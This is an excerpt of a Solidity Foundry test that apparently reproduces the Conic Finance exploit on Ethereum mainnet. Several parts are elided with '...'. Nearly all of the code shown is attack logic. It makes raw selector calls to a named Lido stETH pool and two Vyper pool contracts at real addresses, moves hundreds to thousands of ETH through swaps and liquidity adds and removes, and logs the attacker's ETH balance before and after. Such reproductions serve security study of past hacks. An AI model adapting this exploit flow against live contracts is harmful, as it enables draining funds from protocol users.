...
contract ConicFinanceTest is Test {
    ...
    address private constant lidoPool =
        0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
    address private constant vyperContract1 =
        0x0f3159811670c117c372428D4E69AC32325e4D0F;
    address private constant vyperContract2 =
    ...
    function testExploit() public {
        ...
        emit log_named_decimal_uint(
            "Attacker balance of ETH before exploit",
        ...
        emit log_named_decimal_uint(
            "Attacker balance of ETH after exploit",
            address(this).balance,
            18
        );
    }
    ...
    function exchangeLidoWETH() internal {
        (bool success, ) = lidoPool.call{value: 300 ether}(
            abi.encodeWithSelector(bytes4(0x3df02124), 0, 1, 300e18, 0)
        );
        require(success, "Exchange Lido not successful");
    }

    function exchangeLidoStETH() internal {
        (bool success, ) = lidoPool.call(
            abi.encodeWithSelector(
                bytes4(0x3df02124),
                1,
                0,
    ...
    function addLiquidityToLido() internal {
        (bool success, ) = lidoPool.call{value: 20000 ether}(
            abi.encodeWithSelector(
                bytes4(0x0b4c7e4d),
                [20_000 * 1e18, stETH.balanceOf(address(this))],
                0
            )
        );
    ...
    function addLiquidityToVyperContract(
        address vyperContract,
        uint256 amount1,
        uint256 amount2
    ) internal {
        (bool success, ) = vyperContract.call(
            abi.encodeWithSelector(
                bytes4(0x7328333b),
                [amount1, amount2],
                0,
    ...
    function removeLiquidityFromVyperContract(
        address vyperContract,
        uint256 amount
    ) internal {
        (bool success, ) = vyperContract.call(
    ...
    function interactWithVyperContract2() internal {
        ...
        removeLiquidityFromVyperContract(
            vyperContract2,
            cbETH_ETHf.balanceOf(address(this))
        );
        exchangeVyper(
            vyperContract2,
            WETH.balanceOf(address(this)) - 10e18,
            0,
            1
        );
    }
    ...
    function interactWithVyperContract1() internal {
        ...
        removeLiquidityFromVyperContract(
            vyperContract1,
            rETH_ETHf.balanceOf(address(this))
        );
